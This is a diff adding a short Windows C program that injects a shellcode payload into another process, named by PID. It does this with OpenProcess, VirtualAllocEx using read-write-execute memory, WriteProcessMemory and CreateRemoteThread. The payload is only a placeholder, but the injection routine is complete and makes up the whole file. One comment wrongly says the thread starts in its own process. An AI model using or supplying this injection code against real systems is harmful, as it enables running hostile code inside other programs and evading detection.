@@ -1,0 +1,31 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// payload:
+unsigned char my_payload[] =
+<shellcode>;
+
+unsigned int my_payload_len = sizeof(my_payload);
+
+int main(int argc, char* argv[]) {
+	HANDLE phandle; // our process handle
+	HANDLE rthread; // our remote thread
+	PVOID rbuffer; // remote buffer
+
+	// parse process ID from our argument
+	printf("PID: %i", atoi(argv[1]));
+	phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+
+	// allocating the memory buffer for the remote process
+	rbuffer = VirtualAllocEx(phandle, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+	// copying data between processes
+	WriteProcessMemory(phandle, rbuffer, my_payload, my_payload_len, NULL);
+
+	// starting a new thread in our process
+	rthread = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)rbuffer, NULL, 0, NULL);
+	CloseHandle(phandle);
+	return 0;
+}
